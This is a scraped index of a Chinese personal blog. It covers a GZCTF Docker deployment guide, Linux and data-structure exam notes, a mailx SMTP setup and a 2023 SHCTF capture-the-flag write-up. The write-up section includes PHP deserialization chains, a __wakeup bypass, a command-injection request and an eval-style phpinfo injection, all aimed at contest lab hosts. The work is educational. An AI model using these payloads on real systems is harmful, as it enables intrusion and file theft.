","date":"2024-01-20","objectID":"/docker_gzctf/:0:1","series":null,"tags":["web"],"title":"GZCTF搭建","uri":"/docker_gzctf/#docker安装"},{"categories":["web"],"content":"\rGZCTF部署新建一个文件夹gzctf，创建两个文件appsettings.json，docker-compose.yml appsettings.json写入： { \"AllowedHosts\": \"*\", \"ConnectionStrings\": { \"Database\": \"Host=db:5432;Database=gzctf;Username=postgres;Password=kunkk\" }, \"EmailConfig\": { \"SendMailAddress\": \"a@a.com\", \"UserName\": \"\", \"Password\": \"\", \"Smtp\": { \"Host\": \"localhost\", \"Port\": 587 } }, \"XorKey\": \"xxxx\", \"ContainerProvider\": { \"Type\": \"Docker\", // or \"Kubernetes\" \"PortMappingType\": \"Default\", // or \"PlatformProxy\" \"EnableTrafficCapture\": false, \"PublicEntry\": \"ctf.example.com\", // or \"xxx.xxx.xxx.xxx\" // optional \"DockerConfig\": { \"SwarmMode\": false, \"Uri\": \"unix:///var/run/docker.sock\" } }, \"RequestLogging\": false, \"DisableRateLimit\": true, \"RegistryConfig\": { \"UserName\": \"\", \"Password\": \"\", \"ServerAddress\": \"\" }, \"CaptchaConfig\": { \"Provider\": \"None\", // or \"CloudflareTurnstile\" or \"GoogleRecaptcha\" \"SiteKey\": \"111\", \"SecretKey\": \"111\", // optional \"GoogleRecaptcha\": { \"VerifyAPIAddress\": \"https://www.recaptcha.net/recaptcha/api/siteverify\", \"RecaptchaThreshold\": \"0.5\" } }, \"ForwardedOptions\": { \"ForwardedHeaders\": 5, \"ForwardLimit\": 1, \"TrustedNetworks\": [\"192.168.12.0/8\"] } } docker-compose.yml写入： version: \"3.0\" services: gzctf: image: gztime/gzctf:latest restart: always environment: - \"GZCTF_ADMIN_PASSWORD=MYpassword123\" ports: - \"80:80\" volumes: - \"./data/files:/app/files\" - \"./appsettings.json:/app/appsettings.json:ro\" # - \"./k8sconfig.yaml:/app/k8sconfig.yaml:ro\" # this is required for k8s deployment - \"/var/run/docker.sock:/var/run/docker.sock\" # this is required for docker deployment depends_on: - db db: image: postgres:alpine restart: always environment: - \"POSTGRES_PASSWORD=kunkk\" volumes: - \"./data/db:/var/lib/postgresql/data\" 然后在gzctf文件夹中执行： docker-compose up -d 随后docker ps查看容器ID： sco@sco-virtual-machine:~/gzctf$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ce2011ceac5a gztime/gzctf:latest \"dotnet GZCTF.dll\" 13 minutes ago Up 4 seconds (health: starting) 0.0.0.0:80-\u003e80/tcp, :::80-\u003e80/tcp gzctf-gzctf-1 7a335b65fdd2 postgres:alpine \"docker-entrypoint.s…\" 13 minutes ago Up 3 seconds 5432/tcp gzctf-db-1 使用docker logs 7a335b65fdd2查看数据库日志 随后访问https://127.0.0.1:80 相关题目补充后面再写…… ","date":"2024-01-20","objectID":"/docker_gzctf/:0:2","series":null,"tags":["web"],"title":"GZCTF搭建","uri":"/docker_gzctf/#gzctf部署"},{"categories":["web"],"content":"\r注意事项第一次启动之后docker中postgresql的密码不能再做修改，改成其他密码会认证失败 平台初始管理员账号Admin密码要稍微复杂点 ","date":"2024-01-20","objectID":"/docker_gzctf/:0:3","series":null,"tags":["web"],"title":"GZCTF搭建","uri":"/docker_gzctf/#注意事项"},{"categories":["web"],"content":"\r附录postgresql相关命令： docker compose exec db psql -U postgres psql -U postgres -W psql (15.2) Type \"help\" for help. postgres=# \\c gzctf You are now connected to database \"gzctf\" as user \"postgres\". gzctf=# #do your sql query 进入docker容器： docker exec -it gzctf-db-1 bash 参考笔记： gzctf： https://docs.ctf.gzti.me/quick-start https://blog.csdn.net/qq_41738909/article/details/133660399 https://blog.csdn.net/a142151/article/details/130944500 https://wdh.hk/tech/ctf/%E6%96%B0%E7%9F%A5/GZCTF%E9%83%A8%E7%BD%B2%E7%AC%94%E8%AE%B0.html ctfd: https://blog.csdn.net/Myon5/article/details/134540207 ","date":"2024-01-20","objectID":"/docker_gzctf/:0:4","series":null,"tags":["web"],"title":"GZCTF搭建","uri":"/docker_gzctf/#附录"},{"categories":["notes"],"content":"Unlock to view this content. Unlock to view this content.\r# 课堂划重点速记\r### Linux期末考点\r#### 第一章\r目录以及对应的作用\r切换到某个目录\r几个目录的特殊符号\r常用命令ls -l 以及输出结果含义 -a 复制删除移动文件\r创建目录，删除目录命令\r#### 第二章\r文件和目录的权限以及其含义（什么情况下能删除，什么情况下能复制，什么情况下能创建，什么情况下能创建目录，什么情况下能删除目录）\r备份文件tar命令的选项（主选项，必选项，备选项，源文件，压缩包，压缩包放在其他目录下如何实现，对压缩包进行还原要放在其他目录该怎么做）\r如何搜索文件find命令（find+搜索范围+测试表达式，测试表达式：三个时间序列，文件类型的测试（哪些是普通文件，那些事目录文件）文件大小的测试，文件名称的测试，关于-exec选项的用法，以及-exec选项与管道符的“|”区别\r链接文件（inode，什么是硬链接，什么是软连接，两者区别是什么，看试验任务）\r文件权限（文件权限如何表示，如何改变文件权限，所属用户，所属组）\r#### 第三章（无考点）\r#### 第四章\r用户和用户组相关的配置文件有哪些，文件内容是什么\r用户管理的命令（添加，删除，修改用户属性。这三个命令一定会考（老师说的），复习ppt）\r账号密码安全不作为考试点\r进程管理（监控系统的运行状态top命令，cpu利用率怎么来的，系统的负载怎么来的）\r计划任务（要会写计划任务的命令，记住语法，分时日月周，要会分析计划任务的执行什么样，能找出错误原因，并给出解决方案，看ppt）\r磁盘管理（查看磁盘及其分区，查看磁盘每个分区的挂载位置，磁盘分区的步骤）\r#### 第五章\r服务器的配置，没有出考点\r网络管理，写命令（ping netstat ifconfig，有一个命令要考）\r#### 第六章\r**重点**（30分左右）\rbash，bash和shell的区别（随便记的，老师没说考）\r输入输出重定向，命令历史记录，shell脚本的创建和执行，shell的变量（环境变量$PATH要考）\r课后练习题要弄明白，**会变形考**\r#### 第七章\rgcc编译过程，gdb调试过程（断点+单步，查看变量值，退出）\rppt里上课讲的代码\r---\r# Linux期末考点\r## 第一章\u0026第二章\r### 目录以及对应的作用\r```\r/bin 存放二进制可执行文件\r/home 用户主目录的基点目录\r/lib 存放标准程序设计库目录，又叫动态链接库目录\r/etc 存放系统管理和配置文件目录\r/dev 存放设备特殊文件目录\r/usr 存放应用程序和文件目录\r/proc 虚拟目录，是系统内存的映射\r/root 系统管理员主目录\r/var 存放系统产生的经常变化文件目录\r/tmp 存放公用临时文件目录\r```\r### 切换到某个目录\r```\rcd 绝对路径\ror\rcd 相对路径\r```\r### 几个目录的特殊符号\r```\r. 当前目录\r.. 当前目录的上级目录\r~ 用户主目录\r/ 根目录\r```\r### 常用命令ls -l 以及输出结果含义 -a\r![image-20240111134823013](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240111134823013.png)\r```\r第一列：\r第一个字母含义：\r‘d’：目录文件；\r‘-’：普通文件；\r‘p’：管理文件；\r‘l’：链接文件；\r‘b’：块设备文件；\r’c‘：字符设备文件；\r‘s’：套接字文件。\r后面九个字母分别3个为一组（r表示读权限,w表示写权限,x表示可执行权限,-表示无权限），第一组为表示所有者权限，第二组为表示组用户权限，第三组为表示其他用户组的权限。\r第二列：\r如果是目录的话，这个数字表示当前这个目录下面的一级目录个数（包含.和..）\r如果是文件的话，数字表示硬链接个数（可以理解为一个文件的文件名个数）\r第三列：\r该文件或目录的所有者\r第四列：\r表示所属的\r第五列：\r文件的大小\r第六、七、八列：\r分别为月，号，时，都是最后修改时间\r第九列\r文件名\r```\rls -i是一个 Linux 命令,用于显示文件和目录的 inode 号码以及它们的名称。\r### 复制删除移动文件\r```\rcp [选项] 源文件或目录 目标文件或目录\r选项：\r-d 建立为符号链接\r-f 强行复制\r-i 覆盖目标文件前需要确认\r-R或-r 递归复制\rrm [选项] ...文件或目录...\r选项：\r-f 强制删除\r-i 删除前询问\r-R或-r 递归删除\rmv [选项] 源文件或目录 目标文件或目录\r选项：\r-i -f 同上\r```\r### 创建目录，删除命令\r```\rmkdir [选项]... 目录名...\r选项：\r-m\r```\r### 文件和目录的权限以及其含义\r（什么情况下能删除，什么情况下能复制，什么情况下能创建）\rmkdir创建目录时，要求创建目录用户在当前目录中具有写权限。\r使用rmdir删除目录时，需要拥有对删除目录父目录的写权限，目录被删除前应该是空的。\r复制需要对源文件的读权限，和对目标目录的写权限。\r### 备份文件tar命令\r选项（主选项，必选项，备选项，源文件，压缩包，压缩包放在其他目录下如何实现，对压缩包进行还原要放在其他目录该怎么做）\r```\rtar [选项...] [文件或目录]...\r主选项Actdrux\r-A 新增\r-c 建立新的备份文件\r-t 列出备份文件内容\r--delete 从备份文件中删除指定的文件\r-r 附加到存档文件结尾\r-u 仅将较新的文件附加到存档结尾\r-x 从备份文件中还原文件\r可选项\r-v 显示指令执行过程\r必选项\r-f \u003c备份文件\u003e 指定备份文件\r附加\r-j 同时压缩为.tar.bz2\r-z 同时压缩为.tar.gz\r-C 解压至指定目录\r```\r### 搜索文件find命令\r（find+搜索范围+测试表达式，测试表达式：三个时间序列，文件类型的测试（哪些是普通文件，那些事目录文件）文件大小的测试，文件名称的测试，关于-exec选项的用法，以及-exec选项与管道符的“|”区别\r```\rfind [路径名...] [表达式]\r表达式：\r-amin n 查找最后n分钟被访问过的文件或目录\r-atime n 查找最后nx24小时被访问过的文件或目录\r-ctime n 查找最后n分钟改变状态的文件\r-mtime n 查找在n天内被更改该过的文件或目录\r-type\u003c文件类型\u003e 只寻找符合指定类型的文件（b为块设备文件，d为目录文件，c为字符设备文件，p为管道文件，l为符号链接文件，f为普通文件）\r-size\u003c文件大小\u003e 查找符合指定的文件大小的文件\r-name\u003c范本样式\u003e 指定字符串作文寻找文件或目录的范本样式\r-exec\u003c执行命令\u003e 假设find命令回传值为true，则执行该命令\r```\r#### find命令之exec\r-exec 参数后面跟的是 command 命令，如rm -f，它的终止是以;分号为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。\r{} 花括号代表前面find查找出来的文件名。\r例如：\r```\rfind . -type f -exec ls -l {} \\; //匹配当前目录下的所有普通文件，并在 -exec 选项中使用 ls -l 命令将它们列出。\r```\r再例如：\r```\rfind . -name “*.log” -exec cp {} test3 \\;\r//匹配当前目录下的所有以.log为后缀名的文件，并将他们复制到test3目录中\r```\r#### -exec和管道符|的区别\r管道符的作用是传递文本流，可以看作是管道符将前面的命令输出为一个暂时的文本文件，这个文件是后面命令的操作对象，后面的命令将这个文件整体作为参数执行一次，而find命令默认是不支持这种格式的，所以find命令有一个-exec选项，而-exec选项是对传递到{}中每个查找到的结果依次执行一次-exec后面的命令。\r也就是说，-exec和管道符|传递数据的方式或说是格式不同。\r### 链接文件\r（inode，什么是硬链接，什么是软连接，两者区别是什么，看试验任务）\rinode（索引节点），存储了文件系统对象的一些元信息，比如：所有者、访问权限（读、写、执行）、类型（是文件还是目录）、内容修改时间、inode修改时间、上次访问时间、对应的文件系统存储块的地址，等等\r硬链接\r通过索引结点进行的链接。\r硬链接文件的限制：\r1.不允许给目录创建硬链接。\r2.只有在同一文件系统的文件之间才能创建硬链接。\r符号链接（软链接）\r软链接文件包含另一个文件的路径名。可以给目录创建软连接，可以链接不同文件系统的文件。\r但原文件位置移动，软链接会找不到原文件，但硬链接因索引结点会随着文件的移动而相应改变。\rln命令\r```\rln [选项]... 源文件或目录 目标文件或目录\r-s 建立软连接\r```\r### 文件权限\r（文件权限如何表示，如何改变文件权限，所属用户，所属组）\r- 读取权限（r）：用二进制位表示为 100，对应数字为 4\r- 写入权限（w）：用二进制位表示为 010，对应数字为 2\r- 执行权限（x）：用二进制位表示为 001，对应数字为 1\r执行权限：包括对文件的执行，对文件夹cd访问，对目录的查找\rchmod命令\r```\rchmod [who] [opt]","date":"2023-12-21","objectID":"/linux/:0:0","series":null,"tags":["notes"],"title":"Linux","uri":"/linux/#"},{"categories":["notes"],"content":"Unlock to view this content. Unlock to view this content.\r# 数据结构期末考试\r## 题型安排\r名词解释5道\r计算题5道\r应用题6道（共五十分，其余共五十分）\r算法设计题2道\r## 重点\r### 第一章绪论\r重点考概念\r#### 概念\r**什么是数据结构？**\r数据结构是相互之间存在一种或多种特定关系的数据元素的集合。\r![image-20231208133424697](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231208133424697.png)\r**什么是算法？**\r一个又穷的指令集，这些指令为解决某一特定任务规定了一个运算序列。\r算法的描述：自然语言，流程图，程序设计语言，伪码。\r**什么是时间复杂度？**\r算法中**基本语句重复执行的次数**是**问题规模n**的某个函数f(n),算法的时间量度记作：T(n)=O(f(n))，表示随着n的增大，算法执行的时间的增长率和f(n)的增长率相同，称**渐近时间复杂度**，简称时间复杂度。 ### 第二章线性表\r#### 概念\r**什么是顺序表？**\r顺序表是在计算机内存中以数组的形式保存的线性表。\r**什么是单链表？**\r单链表是一种链式存取的数据结构，用一组地址任意的存储单元存放线性表中的数据元素。\r#### 简答题\r**顺序表和链表的优缺点**\r顺序表优点：\r- 存储密度大\r- 可以随机存取表中任一元素\r- 容易查找一个结点的前驱和后继\r顺序表缺点：\r- 在插入、删除某一元素时，需要移动大量元素\r- 浪费存储空间\r- 属于静态存储形式，数据元素的个数不能自由扩充\r- 建立空表时，较难确定所需的存储空间\r链表优点：\r- 数据元素的个数可以自由扩充\r- 插入、删除等操作不必移动数据，只需要修改链接指针，修改效率高\r链表缺点：\r- 存储密度小\r- 存取效率不高，必须采用顺序存取，即存取数据元素时，只能按链表的顺序进行访问\r**顺序表中第i个元素的地址进行推导计算**\r**由数据元素在内存的存储推导数据元素之间的关系**\r#### 操作题\r**单链表的插入**\r(1)查找第i-1个结点p；\r(2)生成结点s,存入元素e;\r(3)s-\u003enext=p-\u003enext, p-\u003enext=s;\r![image-20231212130838239](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231212130838239.png)\r**单链表的删除**\r(1) 查找第i-1个结点p；\r(2) q=p-\u003enext;p-\u003enext=q-\u003enext;\r(3) free(q)\r![image-20231212131022299](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231212131022299.png)\r---\r![image-20231208134141578](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231208134141578.png)\r![image-20231208134222359](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231208134222359.png)\r![image-20231208134245358](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231208134245358.png)\r![image-20231208134312870](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231208134312870.png)\r![image-20231208134437865](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231208134437865.png)\r![image-20231208134545206](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231208134545206.png)\r### 第三章栈和队列\r主要在**简答题**和**计算题**\r#### 计算题\r**判断合法的入栈出栈序列**\r先入后出\r![image-20231212135219994](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231212135219994.png)\r**判断合法的入队出队序列**\r先入先出\r#### 简答题\r**循环队列关于队空队满的条件判断**\r![image-20231208134902601](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231208134902601.png)\r![image-20231208135048734](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231208135048734.png)\r![image-20231208135244175](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231208135244175.png)\r![image-20231208135407536](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231208135407536.png)\r### 第四章串、数组和广义表\r#### 概念\r**什么是广义表？**\rn ( n\u003e0 )个表元素组成的有限序列，是线性表的一种推广。记作LS = (a0, a1, a2, …, an-1)。\r**求模式串的next函数**（比较重要但考试不考，李健说的）\r#### 计算题\r**给首元素地址，和元素所占据的存储空间，求该元素的下标**\r![image-20231212141405130](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231212141405130.png)\r**广义表求表头，求表尾，求表长度**\r```\r例5.11 广义表E=( a, ( a,b ), d, e, ( ( i , j ),k ))的表头为( )，表尾为( )，长度为( )，深度为( )。\r答：表头为a，表尾为 ( ( a,b ), d, e, ( ( i , j ),k ) )，长度为 5，深度为 3。\r```\r任何一个非空的广义表其表头可能是原子，也可能是子表，而表尾一定是**子表**。\r#### 简答题\r**特殊矩阵（上三角，下三角，对称阵，稀疏矩阵(一般不好考)）的存储方法**\r**对称矩阵**\r![image-20231212143601195](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231212143601195.png)\r**三角矩阵**\r![image-20231212143718097](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231212143718097.png)\r**对角矩阵（带状矩阵）**\r![image-20231212143855919](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231212143855919.png)\r![image-20231212143922350](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231212143922350.png)\r**稀疏矩阵**\r![image-20231212144003162](C:\\Users\\scofi\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231212144003162.png)\r### 第五章树和二叉树\r#### 概念\r**二叉树的定义**\r![image-20231208140717923](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231208140717923.png)\r**二叉树的五个性质（理解做题）**\r![image-20231208141021180](https://scofield-1313710994","date":"2023-12-19","objectID":"/data_structure_notes/:0:0","series":null,"tags":["notes"],"title":"数据结构笔记","uri":"/data_structure_notes/#"},{"categories":["web"],"content":"mailx配置outlook SMTP方式发送邮件 首先我们在outlook中查看SMTP信息 然后在/etc/mail.rc里加入账号等信息 在文件最后添加信息： 登录密码这里，为避免直接输入账户密码，可以在Microsoft安全设置中开启双重验证并添加一个应用密码 创建存放证书的目录 mkdir -p /etc/pki/nssdb/ 测试mail命令 echo \"testcontent\" | mailx -v -s \"testtitle\" scofield_1920@outlook.com testcontent 要发送的邮件内容，多行内容要写\"“里。 testtitle 发送邮件的标题。 scofield_1920@outlook.com 是对方接收邮件的账号。 -s 给邮件追加主题 -a 发送邮件附件，多个附件使用多次-a选项即可 -b 指定密件抄送的收信人地址 -c 指定抄送的收信人地址 -v 显示详细信息，一般是调试连通性的时候使用 在set smtp一栏一定要在域名后添加端口号，不然会出现以下情况： 正常状态： 在目标邮箱收到了测试邮件： ","date":"2023-12-06","objectID":"/mailx/:0:0","series":null,"tags":["web"],"title":"mailx通过外部SMTP发邮件","uri":"/mailx/#"},{"categories":["wp"],"content":"2023SHCTF联赛—工带第二届新生赛 作为组委会摆烂成员， 摸鱼水题出题人， 自己也稍微做了点 更详细的wp见官方wp： https://mp.weixin.qq.com/s/9Q176LuKQAhw7TlNg9vk4A ","date":"2023-11-25","objectID":"/2023shctf/:0:0","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#"},{"categories":["wp"],"content":"\rWEB","date":"2023-11-25","objectID":"/2023shctf/:1:0","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#web"},{"categories":["wp"],"content":"\r[WEEK1]1zzphp套路跟ctfshow web131差不多 import requests url=\"http://112.6.51.212:31610/?num[]=a\" data={ 'c_ode':'very'*250000+'2023SHCTF' } r=requests.post(url,data=data) print(r.text) ","date":"2023-11-25","objectID":"/2023shctf/:1:1","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week11zzphp"},{"categories":["wp"],"content":"\r[WEEK1]ez_serialize \u003c?php class A{ public $var_1='php://filter/read=convert.base64-encode/resource=flag.php'; public function _invoke(){ ​ include($this-\u003evar_1); } } class B{ public $q; public function _wakeup(){ ​ $this-\u003eq=new A(); } } class C { public $var; public $z; public function _toString(){ return $this-\u003ez= new D(); } } class D{ public $p; public function __get($key){ ​ $function = $this-\u003ep = new A(); } } $pop=new B(); $pop-\u003eq=new C(); $pop-\u003eq-\u003ez=new D(); $pop-\u003eq-\u003ez-\u003ep=new A(); echo urlencode(serialize($pop)); ","date":"2023-11-25","objectID":"/2023shctf/:1:2","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1ez_serialize"},{"categories":["wp"],"content":"\r[WEEK1]babyRCEbp发包 GET /?rce=ca\\t${IFS}/fla? HTTP/1.1 Host: 112.6.51.212:31105 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ","date":"2023-11-25","objectID":"/2023shctf/:1:3","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1babyrce"},{"categories":["wp"],"content":"\r[WEEK1]登录就给flag admin/password ","date":"2023-11-25","objectID":"/2023shctf/:1:4","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1登录就给flag"},{"categories":["wp"],"content":"\r[WEEK1]飞机大战右键查看源代码，查看JS代码 找到 解码得到flag ","date":"2023-11-25","objectID":"/2023shctf/:1:5","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1飞机大战"},{"categories":["wp"],"content":"\r[WEEK1]ezphp POST /?code=?.*=${phpinfo()} HTTP/1.1 Host: 112.6.51.212:31240 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0 pattern=.* ","date":"2023-11-25","objectID":"/2023shctf/:1:6","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1ezphp"},{"categories":["wp"],"content":"\r[WEEK2]serialize \u003c?php class misca{ public $gao; public $fei; public $a; public function __get($key){ $this-\u003emiaomiao(); $this-\u003egao=$this-\u003efei; die($this-\u003ea); } public function miaomiao(){ $this-\u003ea='Mikey Mouse~'; } } class musca { public $ding; public $dong; public function __wakeup(){ return $this-\u003eding-\u003edong; } } class milaoshu{ public $v; public function __tostring(){ echo\"misca~musca~milaoshu~~~\"; include($this-\u003ev); } } function check($data){ if(preg_match('/^O:\\d+/',$data)){ die(\"you should think harder!\"); } else return $data; } $MI = new misca(); $MU = new musca(); $MIL = new milaoshu(); $MIL -\u003e v = 'php://filter/read=convert.base64-encode/resource=flag.php'; $MI -\u003e a =\u0026$MI -\u003e gao; $MI -\u003e gao ='1'; $MI -\u003e fei =$MIL; $MU -\u003e ding = $MI; $MU -\u003e dong = 'Arcueid'; echo serialize(array($MU)); ","date":"2023-11-25","objectID":"/2023shctf/:1:7","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week2serialize"},{"categories":["wp"],"content":"\r[WEEK2]no_wake_up \u003c?php class flag { public $username = \"admin\"; public $code = \"php://filter/read=convert.base64-encode/resource=flag.php\"; public function _wakeup() { ​ $this-\u003eusername = \"admin\"; } public function __destruct() { ​ if ($this-\u003eusername = \"admin\") { ​ include($this-\u003ecode); ​ } } } $a= (serialize(new flag)); echo $a; 然后将payload中反序列化的成员数2改成比2大的数 GET /wakeup.php?try=O:4:\"flag\":3:{s:8:\"username\";s:5:\"admin\";s:4:\"code\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";} HTTP/1.1 Host: 112.6.51.212:30930 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://112.6.51.212:30930/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Base解码得到flag ","date":"2023-11-25","objectID":"/2023shctf/:1:8","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week2no_wake_up"},{"categories":["wp"],"content":"\r[WEEK2]EasyCMS进入url/admin/admin.php 查到taoCMS登录弱口令admin/tao 随后在文件管理处找到flag位置 ","date":"2023-11-25","objectID":"/2023shctf/:1:9","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week2easycms"},{"categories":["wp"],"content":"\r[WEEK2]ez_ssti（这个payload push不上去，只能上截图了） [WEEK1]生成你的邀请函吧~ ","date":"2023-11-25","objectID":"/2023shctf/:1:10","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week2ez_ssti"},{"categories":["wp"],"content":"\rMISC","date":"2023-11-25","objectID":"/2023shctf/:2:0","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#misc"},{"categories":["wp"],"content":"\r[WEEK1] 真的签到扫码回复 ","date":"2023-11-25","objectID":"/2023shctf/:2:1","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1-真的签到"},{"categories":["wp"],"content":"\r[WEEK1]ez-misc\r二进制转图片，扫码得到解压密码 然后 放到cyberchef里得到rockyou，使用rockyou字典进行爆破得到解压密码 得到 随后 ","date":"2023-11-25","objectID":"/2023shctf/:2:2","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1ez-misc"},{"categories":["wp"],"content":"\r[WEEK1]残缺的md5 import hashlib m='KCLWG?K8M9O3?DE?84S9' for i in range(26): t1 = m.replace('?',str(chr(65+i)),1) for j in range(26): ​ t2 = t1.replace('?',str(chr(65+j)),1) ​ for h in range(26): ​ t3 = t2.replace('?',str(chr(65+h)),1) ​ s = hashlib.md5(t3.encode('utf8')).hexdigest().upper() ​ if s[:4] == 'F0AF': ​ print(s) ","date":"2023-11-25","objectID":"/2023shctf/:2:3","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1残缺的md5"},{"categories":["wp"],"content":"\r[WEEK1]message\r","date":"2023-11-25","objectID":"/2023shctf/:2:4","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1message"},{"categories":["wp"],"content":"\r[WEEK1]佛说：只能四天\r先栅栏4再rot3然后base16解码，出flag ","date":"2023-11-25","objectID":"/2023shctf/:2:5","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1佛说只能四天"},{"categories":["wp"],"content":"\r[WEEK1]迷雾重重\r","date":"2023-11-25","objectID":"/2023shctf/:2:6","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1迷雾重重"},{"categories":["wp"],"content":"\r[WEEK1]可爱的派蒙捏\r","date":"2023-11-25","objectID":"/2023shctf/:2:7","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1可爱的派蒙捏"},{"categories":["wp"],"content":"\r[WEEK1]请对我使用社工吧图片上有QQ号，tg盒出是东营，知道中石大在东营有个校区，就出了 ","date":"2023-11-25","objectID":"/2023shctf/:2:8","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1请对我使用社工吧"},{"categories":["wp"],"content":"\r[WEEK1]签到题\r","date":"2023-11-25","objectID":"/2023shctf/:2:9","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1签到题"},{"categories":["wp"],"content":"\r[WEEK1]黑暗之歌\r[WEEK1]Jaeger lover steghide extract -sf Typhoon.jpg 密码是：Tri-Sun Horizon Gate 随后拿到了解压密码：.*+#1Ao/aeS 随后 K34-759183-191 ","date":"2023-11-25","objectID":"/2023shctf/:2:10","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1黑暗之歌"},{"categories":["wp"],"content":"\r[WEEK1]Steganography\r将xqwed替换掉base64解出来12ercs…..909jk的点，得到解压密码，解压密码得到flag ","date":"2023-11-25","objectID":"/2023shctf/:2:11","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1steganography"},{"categories":["wp"],"content":"\r[WEEK1]也许需要一些py\rimport hashlib def reverse_case(s): \\# 逐个反转字符串中的大小写字母 result = [] for i in range(2 ** len(s)): ​ new_str = '' ​ for j in range(len(s)): ​ if (i \u003e\u003e j) \u0026 1: ​ new_str += s[j].lower() ​ else: ​ new_str += s[j].upper() ​ result.append(new_str) return result def calculate_md5(s): \\# 计算字符串的md5值 md5_hash = hashlib.md5() md5_hash.update(s.encode('utf-8')) return md5_hash.hexdigest() def main(): input_str = \"pNg_and_Md5_SO_GreaT\" target_md5 = \"63e62fbce22f2757f99eb7da179551d2\" variations = reverse_case(input_str) for var in variations: ​ md5 = calculate_md5(var) ​ print(f\"{var}, MD5: {md5}\") ​ if md5 == target_md5: ​ print(f\"找到匹配的结果: {var}\") ​ break if __name__ == \"__main__\": main() ","date":"2023-11-25","objectID":"/2023shctf/:2:12","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1也许需要一些py"},{"categories":["wp"],"content":"\r[WEEK1]电信诈骗关键词，四行七列，vivo50 ","date":"2023-11-25","objectID":"/2023shctf/:2:13","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1电信诈骗"},{"categories":["wp"],"content":"\r[WEEK3]尓纬玛\r还是有点问题的，，，，把左侧区纠错，得到flag 